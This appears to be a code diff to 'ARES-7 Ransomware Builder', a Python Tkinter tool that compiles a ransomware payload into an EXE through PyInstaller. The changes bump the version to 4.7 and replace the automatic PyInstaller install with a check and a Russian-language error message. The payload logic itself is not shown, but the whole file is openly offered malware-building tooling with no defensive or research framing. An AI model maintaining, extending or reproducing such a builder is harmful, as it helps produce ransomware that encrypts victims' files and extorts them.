@@ -9,11 +9,12 @@ import shutil
 import tempfile
 import threading
 import time
+import importlib.util
 
 class RansomwareBuilder:
     def __init__(self, root):
         self.root = root
-        self.root.title("🔐 ARES-7 Ransomware Builder v4.6")
+        self.root.title("🔐 ARES-7 Ransomware Builder v4.7")
         self.root.geometry("1150x850")
         self.root.configure(bg="#0a0a0a")
         self.root.minsize(1000, 750)
@@ -131,7 +132,7 @@ class RansomwareBuilder:
                                style="Title.TLabel", font=("Segoe UI", 16, "bold"))
         title_label.pack(side="left")
         
-        version_label = ttk.Label(header, text="v4.6", 
+        version_label = ttk.Label(header, text="v4.7", 
                                  foreground=self.colors["gray"])
         version_label.pack(side="left", padx=10)
         
@@ -488,6 +489,28 @@ class RansomwareBuilder:
         finally:
             self.root.after(0, self._finish_build)
     
+    def _check_pyinstaller(self):
+        """Проверяет наличие PyInstaller (без установки)"""
+        # Способ 1: через import
+        try:
+            import PyInstaller
+            return True, "встроенный"
+        except ImportError:
+            pass
+        
+        # Способ 2: через subprocess
+        try:
+            result = subprocess.run(
+                [sys.executable, "-m", "PyInstaller", "--version"],
+                capture_output=True, text=True, timeout=5
+            )
+            if result.returncode == 0:
+                return True, result.stdout.strip()
+        except:
+            pass
+        
+        return False, None
+    
     def _build(self):
         """Основная логика сборки"""
         self._update_status("📋 Сбор параметров...")
@@ -548,15 +571,21 @@ class RansomwareBuilder:
             output_name = self.params["output_name"].get()
             output_dir = self.params["output_path"].get()
             
+            # === ПРОВЕРКА PYINSTALLER (БЕЗ УСТАНОВКИ) ===
             self._update_status("🔧 Проверка PyInstaller...")
             
-            try:
-                subprocess.run([sys.executable, "-m", "pip", "show", "pyinstaller"], 
-                             check=True, capture_output=True)
-            except:
-                self._update_status("📦 Установка PyInstaller...")
-                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "--quiet"], check=True)
+            available, version = self._check_pyinstaller()
             
+            if not available:
+                error_msg = "PyInstaller не найден!\n\n"
+                error_msg += "Для работы билдера нужен PyInstaller.\n"
+                error_msg += "Пожалуйста, установите его вручную:\n"
+                error_msg += "pip install pyinstaller\n\n"
+                error_msg += "Или пересоберите билдер с встроенным PyInstaller."
+                self._show_error("Ошибка", error_msg)
+                return
+            
+            self._update_status(f"✅ PyInstaller {version if version else ''} найден")
             self._update_status("🔧 Сборка EXE через PyInstaller (этап 1/3: анализ)...")
             
             process = subprocess.Popen([
@@ -571,7 +600,6 @@ class RansomwareBuilder:
                 ransomware_path
             ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=tmpdir, encoding='utf-8', errors='replace')
             
-            last_status = ""
             stderr_output = ""
             
             while True:
